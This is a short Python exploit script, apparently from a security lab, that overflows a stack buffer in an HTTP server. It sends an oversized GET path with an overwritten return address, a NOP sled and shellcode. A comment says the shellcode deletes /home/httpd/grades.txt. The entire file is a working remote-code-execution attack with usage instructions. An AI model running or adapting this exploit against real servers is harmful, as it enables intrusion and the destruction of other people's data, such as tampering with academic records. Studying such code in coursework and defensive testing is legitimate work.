import sys, socket, struct

# Use in the form "python exploit-3.py host port"

host = sys.argv[1] # Recieve IP from user
port = int(sys.argv[2]) # Recieve Port from user

shellfile = open("shellcode.bin", "r") #Open the modified Aleph One's shellcode that will unlink /home/httpd/grades.txt file
shellcode = shellfile.read()

eip = struct.pack('<L', 0xbffff624) 

pattern = "A" * 2067 + eip + "\x90" * 4 #payload that will redirect the execution of the program to our NOP sled, which will finally execute our shellcode

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Declare a TCP socket
client.connect((host, port)) # Connect to user supplied port and IP address

command = "GET /" + pattern + shellcode + " HTTP/1.1\r\nHost: "+ host + "\r\nConnection: Close\r\n\r\n" 
client.send(command) # Send the command
data = client.recv(1024) # Recieve Reply
client.close() # Close the Connection
